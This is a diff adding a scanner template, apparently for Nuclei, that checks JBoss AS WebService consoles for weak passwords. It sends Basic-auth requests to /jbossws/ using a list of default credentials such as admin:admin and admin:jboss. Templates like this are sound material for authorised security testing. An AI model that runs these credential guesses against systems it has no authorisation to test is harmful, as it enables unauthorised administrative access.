@@ -1,0 +1,39 @@
+id: poc-yaml-jboss-as-webservice-console-weak-pass
+info:
+  name: JBoss AS WebService Console Weak Password
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password,jboss
+http:
+  - raw:
+      - |
+        GET /jbossws/ HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status: [401]
+  - raw:
+      - |
+        GET /jbossws/ HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{auth}}
+    attack: pitchfork
+    payloads:
+      auth:
+        - "{{base64('admin:admin')}}"
+        - "{{base64('admin:jboss')}}"
+        - "{{base64('jboss:admin')}}"
+        - "{{base64('admin:123456')}}"
+        - "{{base64('admin:password1!')}}"
+        - "{{base64('admin:ezoffice')}}"
+        - "{{base64('admin:Admin123')}}"
+        - "{{base64('admin:Admin12345')}}"
+        - "{{base64('admin:vulhub')}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "Administration"
